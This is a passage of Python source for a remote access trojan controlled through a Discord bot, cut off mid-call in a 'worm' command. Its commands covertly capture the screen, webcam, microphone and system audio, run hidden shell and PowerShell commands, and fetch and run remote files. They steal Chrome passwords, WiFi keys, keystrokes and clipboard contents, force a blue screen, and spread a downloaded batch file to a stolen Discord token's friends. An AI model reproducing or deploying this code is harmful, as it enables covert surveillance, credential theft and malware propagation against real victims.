                # Save to MP4 using mp4v codec
                temp_dir = tempfile.gettempdir()
                temp_path = os.path.join(temp_dir, "screen_recording.mp4")

                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
                out = cv2.VideoWriter(temp_path, fourcc, fps, (width, height))
                for frame in frames:
                    out.write(frame)
                out.release()

                # Send the video to Discord
                try:
                    with open(temp_path, 'rb') as f:
                        video_bytes = io.BytesIO(f.read())
                        video_bytes.seek(0)
                        await ctx.send(file=discord.File(video_bytes, filename="screen_recording.mp4"))
                finally:
                    if os.path.exists(temp_path):
                        os.remove(temp_path)

    recording_task = asyncio.create_task(record_loop())

@bot.command(name='stopscreenrec')
async def stop_screen_recording(ctx):
    global stop_recording, recording_task
    if not recording_task or recording_task.done():
        await ctx.send("⚠️ Not currently recording.")
        return
    stop_recording = True
    await recording_task
    recording_task = None
    await ctx.send("🛑 Stopped screen recording.")









# ----- Webcam Capture -----

@bot.command(name='webcam')
async def webcam(ctx):
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if not ret:
            await ctx.send("❌ Could not access webcam")
            return
        is_success, buffer = cv2.imencode(".png", frame)
        io_buf = io.BytesIO(buffer)
        await ctx.send(file=discord.File(io_buf, filename='webcam.png'))
    except ImportError:
        await ctx.send("❌ OpenCV not installed")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")




webcam_task = None
stop_webcam_recording = False

def get_available_cams(max_cams=5):
    cams = []
    for i in range(max_cams):
        cap = cv2.VideoCapture(i)
        if cap is not None and cap.isOpened():
            cams.append(i)
            cap.release()
    return cams

@bot.command(name='startwebcamrec')
async def start_webcam_recording(ctx):
    global webcam_task, stop_webcam_recording
    if webcam_task and not webcam_task.done():
        await ctx.send("⚠️ Webcam recording already running!")
        return

    stop_webcam_recording = False
    await ctx.send("🎥 Starting webcam recording every 5 seconds...")

    async def record_webcams_loop():
        fps = 15
        duration = 5  # seconds
        frame_count = int(fps * duration)

        cams = get_available_cams()
        if not cams:
            await ctx.send("❌ No webcams detected!")
            return

        while not stop_webcam_recording:
            caps = [cv2.VideoCapture(cam) for cam in cams]
            frames_per_cam = [[] for _ in cams]

            # Capture exact number of frames
            for _ in range(frame_count):
                for idx, cap in enumerate(caps):
                    ret, frame = cap.read()
                    if ret:
                        frames_per_cam[idx].append(frame)
                await asyncio.sleep(1 / fps)

            for cap in caps:
                cap.release()

            # Save and send video for each camera
            for idx, frames in enumerate(frames_per_cam):
                if not frames:
                    continue
                height, width, _ = frames[0].shape

                filename = f"webcam_cam{cams[idx]}.mp4"

                # Use mp4v codec (may work on Discord)
                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
                out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

                for frame in frames:
                    out.write(frame)
                out.release()

                # Send the video
                with open(filename, 'rb') as f:
                    video_bytes = io.BytesIO(f.read())
                    video_bytes.seek(0)
                    await ctx.send(file=discord.File(video_bytes, filename=filename))

                # Clean up
                if os.path.exists(filename):
                    os.remove(filename)

    webcam_task = asyncio.create_task(record_webcams_loop())

@bot.command(name='stopwebcamrec')
async def stop_webcam_recording_cmd(ctx):
    global stop_webcam_recording, webcam_task
    if not webcam_task or webcam_task.done():
        await ctx.send("⚠️ Webcam recording is not running.")
        return
    stop_webcam_recording = True
    await webcam_task
    webcam_task = None
    await ctx.send("🛑 Stopped webcam recording.")







# ----- Audio Recording -----



@bot.command(name='audio')
async def start_recording_loop(ctx):
    global recording_task, stop_recording_flag

    if recording_task is not None and not recording_task.done():
        await ctx.send("⚠️ Already recording!")
        return

    stop_recording_flag = False
    await ctx.send("🔁 Starting continuous audio recording every 5 seconds...")

    async def record_forever():
        fs = 44100
        while not stop_recording_flag:
            try:
                await ctx.send("🎤 Recording for 5 seconds...")
                recording = sd.rec(int(5 * fs), samplerate=fs, channels=2)
                sd.wait()

                # Generate timestamped filename
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                filename = f'audio_{timestamp}.wav'

                # Write to in-memory bytes buffer
                audio_bytes = io.BytesIO()
                wavfile.write(audio_bytes, fs, recording)
                audio_bytes.seek(0)

                # Send to Discord
                await ctx.send(file=discord.File(audio_bytes, filename=filename))

            except Exception as e:
                await ctx.send(f"❌ Error: {e}")
                break

    recording_task = asyncio.create_task(record_forever())


@bot.command(name='audiostop')
async def stop_recording_loop(ctx):
    global stop_recording_flag, recording_task

    if recording_task is None or recording_task.done():
        await ctx.send("⚠️ Not currently recording.")
        return

    stop_recording_flag = True
    await ctx.send("🛑 Stopping audio recording loop...")

    # Optionally wait for the current task to complete
    await recording_task
    recording_task = None









import discord
from discord.ext import commands
import sounddevice as sd
import scipy.io.wavfile as wav
import asyncio
import os
import tempfile

# Globals for audio output recording
output_recording_task = None
stop_output_recording_flag = False
RECORD_SECONDS = 5
SAMPLE_RATE = 44100
TEMP_WAV = "temp_output_audio.wav"


@bot.command(name='outputaudio')
async def start_output_audio(ctx):
    global output_recording_task, stop_output_recording_flag, selected_output_device

    if selected_output_device is None:
        await ctx.send("❌ No output device selected. Use `!setoutputdevices output <index>` first.")
        return

    if output_recording_task is not None and not output_recording_task.done():
        await ctx.send("⚠️ Output audio recording already running!")
        return

    stop_output_recording_flag = False
    await ctx.send(f"🔴 Starting output audio recording from device index {selected_output_device}...")

    async def record_output_loop():
        while not stop_output_recording_flag:
            try:
                device_info = sd.query_devices(selected_output_device)
                hostapi_name = sd.query_hostapis()[device_info['hostapi']]['name'].lower()
                channels = min(device_info['max_input_channels'], 2)
                if channels == 0:
                    await ctx.send(f"❌ Device {selected_output_device} has no input channels for recording.")
                    break
                
                if 'wasapi' in hostapi_name:
                    audio_data = sd.rec(int(RECORD_SECONDS * SAMPLE_RATE),
                                        samplerate=SAMPLE_RATE,
                                        channels=channels,
                                        dtype='int16',
                                        device=selected_output_device,
                                        blocking=True,
                                        extra_settings=sd.WasapiSettings(loopback=True))
                else:
                    audio_data = sd.rec(int(RECORD_SECONDS * SAMPLE_RATE),
                                        samplerate=SAMPLE_RATE,
                                        channels=channels,
                                        dtype='int16',
                                        device=selected_output_device,
                                        blocking=True)

                wav.write(TEMP_WAV, SAMPLE_RATE, audio_data)

                # Send file to Discord
                with open(TEMP_WAV, "rb") as f:
                    discord_file = discord.File(f, filename=f"output_audio_{selected_output_device}.wav")
                    await ctx.send(file=discord_file)

                os.remove(TEMP_WAV)

                # wait 5 seconds before next recording cycle
                await asyncio.sleep(5)

            except Exception as e:
                await ctx.send(f"❌ Error during output audio recording: {e}")
                break

    output_recording_task = asyncio.create_task(record_output_loop())

@bot.command(name='outputaudiostop')
async def stop_output_audio(ctx):
    global stop_output_recording_flag, output_recording_task

    if output_recording_task is None or output_recording_task.done():
        await ctx.send("⚠️ Output audio recording is not currently running.")
        return

    stop_output_recording_flag = True
    await ctx.send("🛑 Stopping output audio recording loop...")
    await output_recording_task
    output_recording_task = None








































import discord
from discord.ext import commands
from PIL import ImageGrab
import io
import socket
import asyncio
import threading



sock = None
send_task = None
recv_thread = None

# Defaults for FPS and monitor
current_fps = 10
current_monitor = 0

def get_monitor_area(monitor_index):
    try:
        import screeninfo
        monitors = screeninfo.get_monitors()
        if 0 <= monitor_index < len(monitors):
            mon = monitors[monitor_index]
            return mon.x, mon.y, mon.width, mon.height
    except ImportError:
        pass
    # Fallback to full screen if screeninfo not available
    screen = ImageGrab.grab()
    return 0, 0, screen.width, screen.height

async def send_screen(sock):
    global current_fps, current_monitor
    try:
        while True:
            x, y, w, h = get_monitor_area(current_monitor)
            img = ImageGrab.grab(bbox=(x, y, x + w, y + h))
            img = img.convert("RGB")
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='JPEG', quality=90)
            data = img_bytes.getvalue()

            header = b'IMG ' + len(data).to_bytes(4, 'big')
            await asyncio.to_thread(sock.sendall, header + data)
            await asyncio.sleep(1 / current_fps)
    except Exception as e:
        print(f"send_screen error: {e}")
    finally:
        sock.close()

def listen_server(sock):
    global current_fps, current_monitor
    try:
        while True:
            header = sock.recv(4)
            if not header:
                break
            if header == b'FPSC':  # FPS Change
                length = int.from_bytes(sock.recv(4), 'big')
                fps_data = sock.recv(length)
                current_fps = int.from_bytes(fps_data, 'big')
                print(f"[Client] FPS changed to {current_fps}")

            elif header == b'MNIT':  # Monitor index change
                length = int.from_bytes(sock.recv(4), 'big')
                mon_data = sock.recv(length)
                current_monitor = int.from_bytes(mon_data, 'big')
                print(f"[Client] Monitor changed to {current_monitor}")

    except Exception as e:
        print(f"listen_server error: {e}")
    finally:
        sock.close()

@bot.command(name='rdp')
async def rdp(ctx, ip: str, port: int):
    global sock, send_task, recv_thread
    if sock:
        await ctx.send("RDP session already running.")
        return
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        await ctx.send(f"RDP connected to {ip}:{port}")

        recv_thread = threading.Thread(target=listen_server, args=(sock,), daemon=True)
        recv_thread.start()

        send_task = asyncio.create_task(send_screen(sock))
    except Exception as e:
        await ctx.send(f"Failed to start RDP: {e}")

@bot.command(name='stoprdp')
async def stoprdp(ctx):
    global sock, send_task
    try:
        if send_task:
            send_task.cancel()
        if sock:
            sock.close()
            sock = None
        await ctx.send("RDP session stopped.")
    except Exception as e:
        await ctx.send(f"ERROR: {e}")

















































































import discord
from discord.ext import commands
import sounddevice as sd
import numpy as np
import queue
import opuslib
import asyncio
import tempfile
import os

# Check for WASAPI support (Windows only)
try:
    import pyaudio
    from pyaudio_wpatch import PyAudioWPatch
    HAS_WASAPI = True
except ImportError:
    HAS_WASAPI = False


# Globals
voice_client = None
voice_channel = None
input_stream = None
output_stream = None
selected_input_device = None
selected_output_device = None
audio_queue = queue.Queue()
audio_mixer_task = None

SAMPLE_RATE = 48000
CHANNELS = 1
FRAME_DURATION_MS = 20
FRAME_SIZE = int(SAMPLE_RATE * FRAME_DURATION_MS / 1000)

opus_encoder = opuslib.Encoder(SAMPLE_RATE, CHANNELS, opuslib.APPLICATION_AUDIO)

mic_buffer = None
output_buffer = None

# ---------------- Device Commands ----------------

@bot.command(name='listdevices')
async def list_devices(ctx):
    devices = sd.query_devices()
    output = "**Audio Devices:**\n\n"
    for i, device in enumerate(devices):
        output += f"{i}: {device['name']} (Inputs: {device['max_input_channels']}, Outputs: {device['max_output_channels']}, HostAPI: {sd.query_hostapis(device['hostapi'])['name']})\n"
    with tempfile.NamedTemporaryFile('w', delete=False, suffix='.txt', encoding='utf-8') as tmpfile:
        tmpfile.write(output)
        temp_filename = tmpfile.name
    await ctx.send("Here is the list of audio devices:", file=discord.File(temp_filename))
    os.remove(temp_filename)

@bot.command(name='defaultdevices')
async def default_devices(ctx):
    default_input = sd.default.device[0]
    default_output = sd.default.device[1]
    devices = sd.query_devices()
    input_name = devices[default_input]['name']
    output_name = devices[default_output]['name']
    await ctx.send(f"\U0001f3a7 Default Devices:\n\U0001f3a4 Input Device (Index {default_input}): {input_name}\n🔊 Output Device (Index {default_output}): {output_name}")

@bot.command(name='setinputdevice')
async def set_input_device(ctx, index: int = None):
    global selected_input_device
    devices = sd.query_devices()

    if index is None:
        await ctx.send("❌ Please specify the input device index like `!setinputdevice 3`.")
        return

    if index < 0 or index >= len(devices):
        await ctx.send("❌ Invalid device index.")
        return

    device_info = devices[index]
    if device_info['max_input_channels'] < 1:
        await ctx.send(f"❌ Device {index} does not support input.")
        return

    selected_input_device = index
    await ctx.send(f"✅ Input device set to {index}: {device_info['name']}")

@bot.command(name='setoutputdevice')
async def set_output_device(ctx, index: int = None):
    global selected_output_device
    devices = sd.query_devices()

    if index is None:
        await ctx.send("❌ Please specify the output device index like `!setoutputdevice 4`.")
        return

    if index < 0 or index >= len(devices):
        await ctx.send("❌ Invalid device index.")
        return

    device_info = devices[index]
    if device_info['max_input_channels'] < 1:
        await ctx.send(f"❌ Device {index} cannot be used to capture output audio (requires loopback-style input).")
        return

    selected_output_device = index
    await ctx.send(f"✅ Output device set to {index}: {device_info['name']}")

# ---------------- Audio Mixing ----------------

def mic_callback(indata, frames, time, status):
    global mic_buffer
    if status:
        print(f"Mic stream status: {status}")
    mic_buffer = indata[:, 0]

def output_callback(indata, frames, time, status):
    global output_buffer
    if status:
        print(f"Output stream status: {status}")
    # Mix stereo to mono if needed
    if indata.shape[1] == 2:
        output_buffer = np.mean(indata, axis=1)
    else:
        output_buffer = indata[:, 0]



async def audio_mixer_loop():
    global mic_buffer, output_buffer
    try:
        while True:
            await asyncio.sleep(FRAME_DURATION_MS / 1000.0)
            if mic_buffer is None and output_buffer is None:
                continue
            if mic_buffer is None:
                mixed = output_buffer
            elif output_buffer is None:
                mixed = mic_buffer
            else:
                min_len = min(len(mic_buffer), len(output_buffer))
                mixed = (mic_buffer[:min_len] + output_buffer[:min_len]) / 2
                mixed = np.clip(mixed, -1.0, 1.0)
            pcm_int16 = (mixed * 32767).astype(np.int16).tobytes()
            opus_data = opus_encoder.encode(pcm_int16, FRAME_SIZE)
            audio_queue.put(opus_data)
    except asyncio.CancelledError:
        pass

class QueueAudioSource(discord.AudioSource):
    def read(self):
        try:
            return audio_queue.get(timeout=1)
        except queue.Empty:
            return None

    def is_opus(self):
        return True

# ---------------- Input Live ----------------

@bot.command(name='listenlive')
async def listenlive(ctx):
    global voice_client, voice_channel, input_stream, audio_mixer_task, output_buffer

    if selected_input_device is None:
        await ctx.send("❌ Please set an input device first using `!setinputdevice <index>`.")
        return

    if voice_client and voice_client.is_connected():
        await ctx.send("Already streaming.")
        return

    guild = ctx.guild
    voice_channel = await guild.create_voice_channel('Input')
    voice_client = await voice_channel.connect()

    input_stream = sd.InputStream(
        device=selected_input_device,
        samplerate=SAMPLE_RATE,
        channels=1,
        callback=mic_callback,
        blocksize=FRAME_SIZE,
    )
    input_stream.start()

    output_buffer = None

    audio_mixer_task = bot.loop.create_task(audio_mixer_loop())
    source = QueueAudioSource()
    voice_client.play(source)

    await ctx.send(f"🎙️ Now live-streaming **input audio** in: {voice_channel.name}")

@bot.command(name='stoplistenlive')
async def stoplistenlive(ctx):
    await reset_live_audio(ctx, reset_input=True)

# ---------------- Output Live ----------------

@bot.command(name='listenliveoutput')
async def listenliveoutput(ctx):
    global voice_client, voice_channel, output_stream, audio_mixer_task, mic_buffer

    if selected_output_device is None:
        await ctx.send("❌ Please set an output device first using `!setoutputdevice <index>`.")
        return

    if voice_client and voice_client.is_connected():
        await ctx.send("Already streaming.")
        return

    guild = ctx.guild
    voice_channel = await guild.create_voice_channel('Output')
    voice_client = await voice_channel.connect()

    dev_info = sd.query_devices(selected_output_device)
    output_channels = max(1, dev_info['max_input_channels'])

    output_stream = sd.InputStream(
        device=selected_output_device,
        samplerate=SAMPLE_RATE,
        channels=output_channels,
        callback=output_callback,
        blocksize=FRAME_SIZE,
    )
    output_stream.start()

    mic_buffer = None

    audio_mixer_task = bot.loop.create_task(audio_mixer_loop())
    source = QueueAudioSource()
    voice_client.play(source)

    await ctx.send(f"🔊 Now live-streaming **output audio** in: {voice_channel.name}")

@bot.command(name='listenliveoutputstop')
async def listenliveoutputstop(ctx):
    await reset_live_audio(ctx, reset_output=True)

# ---------------- Reset Everything ----------------

@bot.command(name='resetlive')
async def resetlive(ctx):
    await reset_live_audio(ctx, reset_input=True, reset_output=True)

async def reset_live_audio(ctx, reset_input=False, reset_output=False):
    global voice_client, voice_channel
    global input_stream, output_stream
    global mic_buffer, output_buffer
    global selected_input_device, selected_output_device
    global audio_mixer_task

    if audio_mixer_task is not None:
        audio_mixer_task.cancel()
        try:
            await audio_mixer_task
        except asyncio.CancelledError:
            pass
        audio_mixer_task = None

    if input_stream:
        input_stream.stop()
        input_stream.close()
        input_stream = None

    if output_stream:
        output_stream.stop()
        output_stream.close()
        output_stream = None

    if voice_client and voice_client.is_connected():
        voice_client.stop()
        await voice_client.disconnect()
        await asyncio.sleep(1)  # important delay
        voice_client = None

    if voice_channel:
        await voice_channel.delete()
        voice_channel = None

    mic_buffer = None
    output_buffer = None

    while not audio_queue.empty():
        try:
            audio_queue.get_nowait()
        except queue.Empty:
            break

    if reset_input:
        selected_input_device = None

    if reset_output:
        selected_output_device = None

    await ctx.send("🧹 Fully reset voice client, streams, buffers, and devices.")

















































current_dir = os.path.expanduser("~")  # Start in the user's home directory

# Hide the command window on Windows
def get_startupinfo():
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return startupinfo
    return None


# ----- CMD Execution -----
@bot.command(name='cmd')
async def run_cmd(ctx, *, command):
    global current_dir

    # Handle "cd" commands
    if command.strip() == 'cd':
        await ctx.send(f"Current directory: `{current_dir}`")
        return
    elif command.startswith('cd '):
        path = command[3:].strip()
        path = os.path.expandvars(path)
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"Directory changed to: `{current_dir}`")
        else:
            await ctx.send(f"❌ Directory not found: `{new_path}`")
        return

    try:
        proc = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_dir,
            startupinfo=get_startupinfo()
        )
        output = proc.stdout + proc.stderr
        if not output:
            output = "Command executed with no output."
        if len(output) > 1900:
            with io.StringIO(output) as f:
                await ctx.send(file=discord.File(f, filename='cmd_output.txt'))
        else:
            await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


# ----- PowerShell Execution -----
@bot.command(name='ps')
async def run_powershell(ctx, *, command):
    global current_dir

    # Handle "cd" commands
    if command.strip() == 'cd':
        await ctx.send(f"Current directory: `{current_dir}`")
        return
    elif command.startswith('cd '):
        path = command[3:].strip()
        path = os.path.expandvars(path)
        new_path = os.path.abspath(os.path.join(current_dir, path))
        if os.path.isdir(new_path):
            current_dir = new_path
            await ctx.send(f"Directory changed to: `{current_dir}`")
        else:
            await ctx.send(f"❌ Directory not found: `{new_path}`")
        return

    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-Command", command],
            capture_output=True,
            text=True,
            cwd=current_dir,
            startupinfo=get_startupinfo()
        )
        output = proc.stdout + proc.stderr
        if not output:
            output = "Command executed with no output."
        if len(output) > 1900:
            with io.StringIO(output) as f:
                await ctx.send(file=discord.File(f, filename='ps_output.txt'))
        else:
            await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")




# ----- File Management -----

@bot.command(name='download')
async def download_file(ctx, *, file_path):
    if not os.path.exists(file_path):
        await ctx.send("❌ File not found")
        return
    try:
        await ctx.send(file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='upload')
async def upload_file(ctx, url, *, dest):
    try:
        response = requests.get(url, stream=True, timeout=10)
        response.raise_for_status()
        with open(dest, 'wb') as f:
            for chunk in response.iter_content(8192):
                f.write(chunk)
        await ctx.send(f"✅ File downloaded to {dest}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='run')
async def run_app(ctx, *, app):
    try:
        subprocess.Popen(app, shell=True)
        await ctx.send(f"▶️ Running: {app}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='lock')
async def lock(ctx):
    try:
        if platform.system() == 'Windows':
            ctypes.windll.user32.LockWorkStation()
            await ctx.send("🔒 PC Locked")
        else:
            await ctx.send("❌ Lock not supported on this OS")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='shutdown')
async def shutdown(ctx):
    try:
        if platform.system() == 'Windows':
            subprocess.run("shutdown /s /t 0", shell=True)
        elif platform.system() == 'Linux':
            subprocess.run("shutdown now", shell=True)
        await ctx.send("💀 Shutting down...")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='reboot')
async def reboot(ctx):
    try:
        if platform.system() == 'Windows':
            subprocess.run("shutdown /r /t 0", shell=True)
        elif platform.system() == 'Linux':
            subprocess.run("reboot", shell=True)
        await ctx.send("♻️ Rebooting...")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")





@bot.command(name='bluescreen')
async def reboot(ctx):
    try:
        from ctypes import windll          # Import Windows DLLs interface module from ctypes
        from ctypes import c_int           # Import C integer type
        from ctypes import c_uint          # Import C unsigned integer type
        from ctypes import c_ulong         # Import C unsigned long type
        from ctypes import POINTER         # Import POINTER type constructor from ctypes
        from ctypes import byref           # Import by reference passing helper from ctypes

        nullptr = POINTER(c_int)()         # Create a null pointer of type POINTER to c_int

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),                    # The privilege to adjust to   : "SeShutdownPrivilege" = 19
            c_uint(1),                     # Boolean status of privilege : Enabled = 1
            c_uint(0),                     # Whether to adjust the privilege for the calling thread's access token: Process = 0, Thread = 1
            byref(c_int())                 # Placeholder for the previous state (not used here)
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B),           # The error code to raise (0xC000007B is an NTSTATUS code)
            c_ulong(0),                    # The number of parameters that follow (0 in this case)
            nullptr,                       # Optional pointer to an array of ULONG_PTRs that contains the parameters
            nullptr,                       # Optional pointer to the string if the error includes a string parameter
            c_uint(6),                     # The response option used in the message box (6 for 'Abort/Retry/Ignore')
            byref(c_uint())                # Placeholder where the function will return which option was selected
        )
        await ctx.send("💀 BSOD Triggered....")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# ----- Credentials -----

@bot.command(name='chrome_passwords')
async def get_chrome_passwords(ctx):
    try:
        if platform.system() != 'Windows':
            await ctx.send("❌ Only supported on Windows")
            return
        
        login_data_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data'
        )
        
        if not os.path.exists(login_data_path):
            await ctx.send("❌ Chrome password database not found")
            return
        
        temp_db = os.path.join(REALTEK_DIR, 'chrome_temp.db')
        shutil.copy2(login_data_path, temp_db)
        
        passwords = []
        try:
            with sqlite3.connect(temp_db) as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for origin_url, username, encrypted_password in cursor.fetchall():
                    try:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                    except Exception:
                        password = "❌ Decryption failed"
                    passwords.append(f"🌐 {origin_url}\n👤 {username}\n🔑 {password}\n")
        except Exception as e:
            await ctx.send(f"❌ Database error: {str(e)}")
            return
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
        
        if not passwords:
            await ctx.send("ℹ️ No saved passwords found")
            return
        
        message = "🔑 Chrome Passwords:\n\n" + "\n".join(passwords)
        if len(message) > 2000:
            with io.StringIO(message) as f:
                await ctx.send(file=discord.File(f, filename='chrome_passwords.txt'))
        else:
            await ctx.send(message)
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='wifi_passwords')
async def wifi_passwords(ctx):
    try:
        if platform.system() != 'Windows':
            await ctx.send("❌ WiFi passwords retrieval only supported on Windows.")
            return
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        profiles = []
        for line in output.split('\n'):
            if "All User Profile" in line:
                profiles.append(line.split(":")[1].strip())
        results = []
        for profile in profiles:
            try:
                res = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                for line in res.split('\n'):
                    if "Key Content" in line:
                        key = line.split(":")[1].strip()
                        results.append(f"{profile}: {key}")
            except:
                results.append(f"{profile}: No Key Found")
        if results:
            await ctx.send("📶 WiFi Passwords:\n" + "\n".join(results))
        else:
            await ctx.send("No WiFi profiles found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# ----- Keylogger commands -----

@bot.command(name='keylog_start')
async def keylog_start(ctx):
    if keylogger.start():
        await ctx.send("✅ Keylogger started")
    else:
        await ctx.send("⚠️ Keylogger already running")

@bot.command(name='keylog_stop')
async def keylog_stop(ctx):
    if keylogger.stop():
        await ctx.send("🛑 Keylogger stopped")
    else:
        await ctx.send("⚠️ Keylogger not running")

@bot.command(name='keylog_show')
async def keylog_show(ctx):
    if not os.path.exists(KEYLOG_PATH):
        await ctx.send("❌ No keylog file found")
        return
    try:
        with open(KEYLOG_PATH, "r", encoding='utf-8') as f:
            content = f.read()
        if len(content) > 1900:
            with io.StringIO(content) as f_io:
                await ctx.send(file=discord.File(f_io, filename='ntuser.dat'))
        else:
            await ctx.send(f"📋 Keylog Content:\n```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# ----- Clipboard -----

@bot.command(name='clipboard')
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if not content:
            content = "[Empty Clipboard]"
        if len(content) > 1900:
            with io.StringIO(content) as f:
                await ctx.send(file=discord.File(f, filename='clipboard.txt'))
        else:
            await ctx.send(f"📋 Clipboard Content:\n```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

# ----- File Management commands -----
current_dir = os.getcwd()

@bot.command(name='ls')
async def list_dir(ctx, *, path=None):
    global current_dir
    path = os.path.abspath(path) if path else current_dir
    if not os.path.exists(path):
        await ctx.send("❌ Directory does not exist")
        return
    try:
        files = os.listdir(path)
        files.sort()
        header = f"📁 Contents of {path}:\n"
        max_length = 2000

        message_lines = [header]
        for filename in files:
            line = filename + "\n"
            if sum(len(l) for l in message_lines) + len(line) > max_length:
                await ctx.send("".join(message_lines))
                message_lines = []
            message_lines.append(line)

        if message_lines:
            await ctx.send("".join(message_lines))

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command(name='cd')
async def change_dir(ctx, *, path):
    global current_dir
    expanded_path = os.path.abspath(os.path.expandvars(path))
    if not os.path.exists(expanded_path) or not os.path.isdir(expanded_path):
        await ctx.send("❌ Directory does not exist")
        return
    current_dir = expanded_path
    await ctx.send(f"📂 Current directory changed to: {current_dir}")



@bot.command(name='pwd')
async def print_working_dir(ctx):
    global current_dir
    await ctx.send(f"📂 Current directory: {current_dir}")


@bot.command(name='rm')
async def remove_path(ctx, *, path):
    global current_dir
    try:
        full_path = os.path.join(current_dir, path)
        if os.path.isfile(full_path):
            os.remove(full_path)
            await ctx.send(f"🗑️ Deleted file: {full_path}")
        elif os.path.isdir(full_path):
            shutil.rmtree(full_path)
            await ctx.send(f"🗑️ Deleted directory: {full_path}")
        else:
            await ctx.send("❌ Path does not exist")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command(name='mkdir')
async def make_dir(ctx, *, name):
    global current_dir
    try:
        path = os.path.join(current_dir, name)
        os.makedirs(path, exist_ok=True)
        await ctx.send(f"📁 Directory created: {path}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command(name='search')
async def search_files(ctx, *, filename):
    global current_dir
    try:
        results = []
        for root, dirs, files in os.walk(current_dir):
            if filename in files:
                results.append(os.path.join(root, filename))
            if len(results) > 20:
                break
        if results:
            await ctx.send("🔍 Found files:\n" + "\n".join(results))
        else:
            await ctx.send("No files found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")



# ----- Network commands -----

@bot.command(name='ip')
async def get_ip(ctx):
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        await ctx.send(f"🌐 IP Addresses:\nLocal: {local_ip}\nPublic: {public_ip}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='portscan')
async def port_scan(ctx, ip: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        sock.close()
        if result == 0:
            await ctx.send(f"✅ Port {port} is open on {ip}")
        else:
            await ctx.send(f"❌ Port {port} is closed on {ip}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='ping')
async def ping_host(ctx, host: str):
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '4', host]
        proc = subprocess.run(command, capture_output=True, text=True)
        output = proc.stdout or proc.stderr
        if len(output) > 1900:
            with io.StringIO(output) as f:
                await ctx.send(file=discord.File(f, filename='ping.txt'))
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='whois')
async def whois_lookup(ctx, domain: str):
    try:
        proc = subprocess.run(['whois', domain], capture_output=True, text=True)
        output = proc.stdout or proc.stderr
        if len(output) > 1900:
            with io.StringIO(output) as f:
                await ctx.send(file=discord.File(f, filename='whois.txt'))
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='ifconfig')
async def ifconfig(ctx):
    try:
        if platform.system().lower() == 'windows':
            proc = subprocess.run(['ipconfig'], capture_output=True, text=True)
        else:
            proc = subprocess.run(['ifconfig'], capture_output=True, text=True)
        output = proc.stdout or proc.stderr
        if len(output) > 1900:
            with io.StringIO(output) as f:
                await ctx.send(file=discord.File(f, filename='ifconfig.txt'))
        else:
            await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")






@bot.command(name='worm')
async def worm_command(ctx, url: str, token: str):
    """Downloads a bat file from URL and sends it to all friends of the provided token"""
    try:
        await ctx.send("🐛 Starting worm propagation...")
        
        # 1. Download the bat file
        await ctx.send(f"📥 Downloading file from {url}...")
        try:
            response = requests.get(url, stream=True, timeout=30)
            response.raise_for_status()
            bat_content = response.content
            if not bat_content:
                await ctx.send("❌ Downloaded file is empty")
                return
        except Exception as e:
            await ctx.send(f"❌ Failed to download file: {e}")
            return
        
        # 2. Get friends list
        await ctx.send("👥 Getting friends list...")
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0'
        }
        
        try:
            friends_resp = requests.get(
